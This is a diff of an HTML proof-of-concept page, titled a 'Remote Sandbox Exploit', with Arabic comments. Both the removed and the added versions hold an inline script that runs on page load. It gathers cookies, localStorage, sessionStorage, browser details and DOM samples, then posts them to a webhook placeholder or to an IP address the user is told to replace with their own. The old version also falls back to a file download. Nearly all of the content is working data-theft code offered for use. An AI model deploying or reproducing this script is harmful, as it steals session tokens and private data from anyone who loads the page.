@@ -1,66 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>🔥 Remote Exploit PoC</title>
+  <meta charset="UTF-8">
+  <title>🔥 Remote Sandbox Exploit PoC</title>
 </head>
 <body>
-  <h2>🚀 Remote Exploit PoC – Auto Data Exfiltration</h2>
+  <h2>🔥 Sandbox Exploit – Remote Data Extraction</h2>
+  <p>Check the console for logs... Data will be sent remotely ✅</p>
+
   <script>
-    (async () => {
-      console.log("🚀 Remote PoC started...");
+    console.log("🚀 PoC started – collecting data...");
 
-      const stolen = {
-        cookies: document.cookie || "",
-        localStorage: {},
-        sessionStorage: {},
-        info: {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          lang: navigator.language,
-          url: location.href,
-          time: new Date().toISOString()
-        }
-      };
+    // 1. اجمع البيانات
+    const stolen = {
+      cookies: document.cookie || "",
+      localStorage: {},
+      sessionStorage: {},
+      info: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        lang: navigator.language,
+        url: location.href,
+        time: new Date().toISOString()
+      },
+      domSample: Array.from(document.querySelectorAll("*"))
+                     .slice(0, 5)
+                     .map(el => el.outerHTML)
+    };
 
-      // dump localStorage
-      for (let i = 0; i < localStorage.length; i++) {
-        const k = localStorage.key(i);
-        stolen.localStorage[k] = localStorage.getItem(k);
-      }
+    // 2. عرض محلي (للتأكيد)
+    console.log("📦 Data collected:");
+    console.log(stolen);
 
-      // dump sessionStorage
-      for (let i = 0; i < sessionStorage.length; i++) {
-        const k = sessionStorage.key(i);
-        stolen.sessionStorage[k] = sessionStorage.getItem(k);
-      }
-
-      console.log("📦 Data collected:", stolen);
-
-      // exfiltration via fetch (if CSP يسمح)
-      try {
-        await fetch("https://YOUR-WEBHOOK-HERE/post", {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify(stolen)
-        });
-        console.log("🌐 Data exfiltrated to server.");
-      } catch(e) {
-        console.warn("⚠️ Fetch blocked by CSP, falling back to file download");
-      }
-
-      // fallback: trigger file download
-      const blob = new Blob([JSON.stringify(stolen, null, 2)], {type:'application/json'});
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = "sandbox_dump_" + Date.now() + ".json";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-
-      console.log("💾 File download triggered.");
-    })();
+    // 3. إرسال للخارج (Webhook أو سيرفرك)
+    const exfilUrl = "http://192.168.100.103:8080"; // ← غيره برابطك
+    fetch(exfilUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(stolen)
+    })
+    .then(r => console.log("🌐 Remote exfil success →", r.status))
+    .catch(e => console.error("⚠️ Exfil blocked:", e));
   </script>
 </body>
 </html>
